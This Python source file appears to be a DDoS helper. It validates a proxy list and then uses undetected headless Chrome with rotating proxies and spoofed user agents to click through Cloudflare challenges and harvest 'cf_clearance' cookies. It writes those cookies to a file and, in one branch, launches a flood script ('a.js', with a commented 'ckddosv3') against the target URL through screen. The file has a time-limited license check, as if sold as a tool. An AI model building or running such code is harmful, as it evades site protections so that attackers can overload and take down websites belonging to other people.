import threading
import socks
import ssl
import time
import sys
target_host = "www.google.com"
target_port = 443
proxy_type_list = {
    "http": socks.HTTP,
    "socks4": socks.SOCKS4,
    "socks5": socks.SOCKS5
}
proxy_type = 'http'
pysocks_proxy_type = proxy_type_list[proxy_type]
input_file = 'proxy.txt'
output_file = 'proxy.txt'
timeout = 3
total_socks = [proxy.strip() for proxy in open(input_file)]
live_socks = []
live_socks_counter = 0
def connect_socks(socks_address):
    try:
        global live_socks_counter
        dead_socks_counter = 0
        headers = "GET / HTTP/1.3\r\nHost: " + target_host + "\r\n\r\n"
        socks_address_split = socks_address.split(":")
        socks_host = socks_address_split[0]
        socks_port = int(socks_address_split[1])
        conn= None
        try:
            socks.setdefaultproxy(pysocks_proxy_type, socks_host, socks_port)
        except:
            total_socks.remove(socks_address)
            return
        while True:
            if dead_socks_counter == 1:
                total_socks.remove(socks_address)
                break
            try:
                conn = socks.socksocket()
                conn.settimeout(timeout)
                conn.connect((target_host, target_port))
                if target_port == 443:
                    ssl_context = ssl.create_default_context()
                    conn = ssl_context.wrap_socket(conn, server_hostname=target_host)
                conn.send(headers.encode())
                conn.close()
                live_socks.append(socks_address)
                live_socks_counter += 1
                break
            except:
                conn.close()
                dead_socks_counter += 1
    except:
        shfdsdfhsf=263462346234

thread_list = []
import time
for socks_address in total_socks:
    thread = threading.Thread(target=connect_socks, args=(socks_address, ))
    thread.start()
    thread_list.append(thread)
    sys.stdout.flush()
for thread in thread_list:
    thread.join()
    sys.stdout.flush()
file = open(output_file, "w")
for socks_address in live_socks:
    file.write(socks_address + "\n")
file.close()
import undetected_chromedriver as uc
from selenium.webdriver import ActionChains
import concurrent.futures
import time
from selenium.webdriver.common.by import By 
import subprocess
import random
from subprocess import Popen
from selenium.webdriver.common.proxy import Proxy, ProxyType
import subprocess
import datetime
import threading
import socks
import ssl
import time
import sys
class LicenseManager:
    def __init__(self, start_date, end_date):
        self.start_date = start_date
        self.end_date = end_date

    def is_license_valid(self):
        current_date = datetime.datetime.now()
        return self.start_date <= current_date <= self.end_date
similar_user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.188",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.188",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
]
def connect_socks(socks_address):
    hehe=0
    try:
        target_host='www.google.com'
        
        dead_socks_counter = 0
        headers = "GET / HTTP/1.1\r\nHost: " + target_host + "\r\n\r\n"
        socks_address_split = socks_address.split(":")
        socks_host = socks_address_split[0]
        socks_port = int(socks_address_split[1])
        conn= None
        try:
            socks.setdefaultproxy(socks.HTTP, socks_host, socks_port)
        except Exception as e:
            return False
        while True:
            if dead_socks_counter == 1:
                break
            try:
                conn = socks.socksocket()
                conn.settimeout(3)
                conn.connect(("www.google.com", 443))
                ssl_context = ssl.create_default_context()
                conn = ssl_context.wrap_socket(conn, server_hostname='www.google.com')
                conn.send(headers.encode())
                conn.close()
                hehe=1
                break
            except Exception as e:
                conn.close()
                dead_socks_counter += 1
    except Exception as e:
        shfdsdfhsf=263462346234
    if hehe==1:
        return True
    else:
        return False
def double_click_at_coordinates(url, proxy_address,methods):
    if connect_socks(proxy_address)==True:
        proxy = Proxy()
        proxy.proxy_type = ProxyType.MANUAL
        proxy.http_proxy = proxy_address
        proxy.ssl_proxy = proxy_address
        options = uc.ChromeOptions()
        options.add_argument(f'--proxy-server=http://{proxy_address}')
        options.add_argument("--disable-gpu")
        options.add_argument('--ignore-certificate-errors')
        options.add_argument('--ignore-ssl-errors')
        options.add_argument("--disable-popup-blocking")
        options.add_argument("--incognito")
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-setuid-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--remote-debugging-port=9515')
        a123=random.choice(similar_user_agents)
        options.add_argument(f"--user-agent={a123}")
    
        driver = uc.Chrome(headless=True, use_subprocess=False, driver_executable_path ="/home/myuser/.local/share/undetected_chromedriver/chromedriver_copy/chromedriver",options=options)

        try:

            driver.implicitly_wait(30)
            driver.set_window_size(433, 1000)
            driver.get("https://api.ipify.org/")
            time.sleep(2)
            

            html = driver.page_source
            if html.find("word-wrap: break-word; white-space: pre-wrap;")!=-1:
                driver.execute_script('''window.open("'''+url+'''","_blank")''')  # open page in new tab
                time.sleep(30)  # wait until page has loaded
                driver.switch_to.window(window_name=driver.window_handles[0])  # switch to first tab
                driver.close()  # close first tab
                driver.switch_to.window(window_name=driver.window_handles[0])
                x1=0
                lan=0
                cookies = driver.get_cookies()


                
                
            
                for i in range(1,30):
                    try:
                        time.sleep(1)
                        cookies = driver.get_cookies()
                        if str(cookies).find('cf_clea')!=-1:
                            break
                        node = driver.find_element(By.XPATH, '/html/body/div[1]/div/div[1]/div')
                        
                        x=node.location['x']
                        y=node.location['y']
                        x1=node.size['height']
                        y1=node.size['width']

                        
                        if x1!=0:
                            time.sleep(5)
                            actions1 = ActionChains(driver)
                            actions1.move_by_offset(x+y1//2,y+x1//2).click().perform()                                    
                            time.sleep(15)                     
                            break
                            
                        
                        
                        
                    except Exception as e:
                        dgfjjdf=345734573
                # Print the website cookie after completing the actions
                cookies = driver.get_cookies()
                if cookies==[]:
                    driver.execute_script('''window.open("'''+url+'''","_blank")''')  # open page in new tab
                    time.sleep(30)  # wait until page has loaded
                    driver.switch_to.window(window_name=driver.window_handles[0])  # switch to first tab
                    driver.close()  # close first tab
                    driver.switch_to.window(window_name=driver.window_handles[0])
                    x1=0
                    lan=0
                    
                    
                    for i in range(1,30):
                        try:
                            time.sleep(1)
                            cookies123 = driver.get_cookies()
                            if str(cookies123).find('cf_clea')!=-1:

                                break
                            node = driver.find_element(By.XPATH, '/html/body/div[1]/div/div[1]/div')
                            
                            x=node.location['x']
                            y=node.location['y']
                            x1=node.size['height']
                            y1=node.size['width']
                            

                            if x1!=0:
                                time.sleep(5)
                                actions1 = ActionChains(driver)
                                actions1.move_by_offset(x+y1//2,y+x1//2).click().perform()
                                time.sleep(15)
                                break
                                
                            
                            
                            
                        except Exception as e:
                            jdfgjdfgjdgf=623462436234
                cookies = driver.get_cookies()           
                if cookies!=[]:
                    cookie_string = ""
                    for hehe, cookie in enumerate(cookies):
                        cookie_string += f"{cookie['name']}={cookie['value']}"
                        if hehe < len(cookies) - 1:
                            cookie_string += "; "
                
                for cookie in cookies:
                    if (len(str(cookie['value']).strip())>10) and (str(cookie['name']).find('cf_clea')!=-1):
                        print(f"{proxy_address}|{cookie_string}|{a123}")
                        a=open("cookie.txt", "a")
                        a.write(f"{proxy_address}|{cookie_string}|{a123}\n")
                        a.close()
                        #subprocess.run(['screen', '-dm', 'node','a.js', url, '120', '1', proxy_address, '20', cookie_string , a123, 'GET','TRIAL'])
                        #subprocess.run(['screen','-dm','./ckddosv3', url, a123, '120', cookie_string, methods, '2000', proxy_address])
                        
                        
                    elif (str(cookie['name']).strip()=='cf_clea'):
                        driver.execute_script('''window.open("'''+url+'''","_blank")''')  # open page in new tab
                        time.sleep(30)  # wait until page has loaded
                        driver.switch_to.window(window_name=driver.window_handles[0])  # switch to first tab
                        driver.close()  # close first tab
                        driver.switch_to.window(window_name=driver.window_handles[0])
                        x1=0                   
                        for i in range(1,30):
                            try:
                                cookies1233 = driver.get_cookies()
                                if len(str(cookies1233).find('cf_clea'))!=-1:
                                    break
                                time.sleep(1)
                                node = driver.find_element(By.XPATH, '/html/body/div[1]/div/div[1]/div')
                                x=node.location['x']
                                y=node.location['y']
                                x1=node.size['height']
                                y1=node.size['width']

                                if x1!=0:
                                    time.sleep(5)
                                    actions1 = ActionChains(driver)
                                    actions1.move_by_offset(x+y1//2,y+x1//2).click().perform()
                                    time.sleep(15)
                                    break
                            except Exception as e:
                                hsfhsdf=26362346234
                        
                        # Print the website cookie after completing the actions
                        cookies123 = driver.get_cookies()
                        if cookies123==[]:
                            driver.execute_script('''window.open("'''+url+'''","_blank")''')  # open page in new tab
                            time.sleep(30)  # wait until page has loaded
                            driver.switch_to.window(window_name=driver.window_handles[0])  # switch to first tab
                            driver.close()  # close first tab
                            driver.switch_to.window(window_name=driver.window_handles[0])
                            x1=0
                            lan=0
                            
                            
                            for i in range(1,30):
                                try:
                                    time.sleep(1)
                                    cookies12333 = driver.get_cookies()
                                    if str(cookies12333).find('cf_clea')!=-1:
                                        break
                                    node = driver.find_element(By.XPATH, '/html/body/div[1]/div/div[1]/div')
                                    
                                    x=node.location['x']
                                    y=node.location['y']
                                    x1=node.size['height']
                                    y1=node.size['width']

                                    if x1!=0:
                                        time.sleep(5)
                                        actions1 = ActionChains(driver)
                                        actions1.move_by_offset(x+y1//2,y+x1//2).click().perform()
                                        time.sleep(15)
                                        break
                                except Exception as e:
                                    hsfhsdf=26362346234
                        cookies123 = driver.get_cookies()
                            
                        
                        if cookies123!=[]:
                            cookie_string = ""
                            for hehe, cookie1 in enumerate(cookies123):
                                cookie_string += f"{cookie1['name']}={cookie1['value']}"
                                if hehe < len(cookies123) - 1:
                                    cookie_string += "; "
                        for cookie1 in cookies123:
                            if (len(str(cookie1['value']).strip())>10) and (str(cookie1['name']).find('cf_clea')!=-1):
                                print(f"{proxy_address}|{cookie_string}|{a123}")
                                subprocess.run(['screen', '-dm', 'node','a.js', url, '120', '1', proxy_address, '32', cookie_string , a123, 'GET','TRIAL'])
                                #subprocess.run(['screen','-dm','./ckddosv3', url, a123, '120', cookie_string, methods, '2000' , proxy_address])

                                a=open("cookie.txt", "a")
                
                                a.write(f"{proxy_address}|{cookie_string}|{a123}\n")
                                a.close()
                    
                driver.quit()
            else:
                driver.quit()
                
        except Exception as e:
            driver.quit()
import sys
def main(proxy_address,url1,methods):
    url = url1  # Replace with your desired URL
    try:
        double_click_at_coordinates(url, proxy_address,methods)
    except Exception as e:
         
        jdgfjdf=263462346234
import time
import sys
if __name__ == "__main__":
    # Replace these values with the actual start and end dates of your license
    start_date = datetime.datetime(2023, 1, 1)
    end_date = datetime.datetime(2023, 8, 9)

    license_manager = LicenseManager(start_date, end_date)
    if license_manager.is_license_valid():
        url = sys.argv[1]
        print(url)
        start_time = time.time()

        # Your application code goes here.

    try:
        a = open("cookie.txt", "w")
        a.close()
        with open("proxy.txt", "r") as proxy_file:
            proxies = proxy_file.read().splitlines()

        # Define the maximum script runtime in seconds
        max_runtime = int(sys.argv[2])
        methods=sys.argv[3]
        thread=int(sys.argv[4])
        futures = []

        # Create a thread pool with a maximum of 15 threads
        with concurrent.futures.ThreadPoolExecutor(max_workers=thread) as executor:
            # Submit tasks to the thread pool for each proxy
            for proxy in proxies:
                future = executor.submit(main, proxy, url,methods)
                futures.append(future)

            # Wait for the threads to finish or reach the maximum runtime
            for future in concurrent.futures.as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    print("Thread encountered an error:", e)

                # Check if the maximum runtime has been reached
                elapsed_time = time.time() - start_time
                if elapsed_time >= max_runtime:
                    # Attempt to gracefully terminate running threads
                    for f in futures:
                        try:
                            subprocess.run(["pkill", "-f", 'chrome'], check=False)
                            subprocess.run(["pkill", "-f", 'google'], check=False)
                        except:
                            hsfdhsdf=2346263
                        try:
                            subprocess.run(["pkill", "-f", 'screen'], check=False)
                        except:
                            hsdfhf=62346234
                        if not f.done():
                            f.cancel()
                    break

        # Attempt to gracefully terminate running threads
        for future in futures:
            if not future.done():
                try:
                    subprocess.run(["pkill", "-f", 'chrome'], check=False)
                    subprocess.run(["pkill", "-f", 'google'], check=False)
                except:
                    hsfdhsdf=2346263
                try:
                    subprocess.run(["pkill", "-f", 'screen'], check=False)
                except:
                    hsdfhf=62346234
                future.cancel()

        print("All threads completed within {} seconds.".format(elapsed_time))
    except Exception as e:
        print("An error occurred:", e)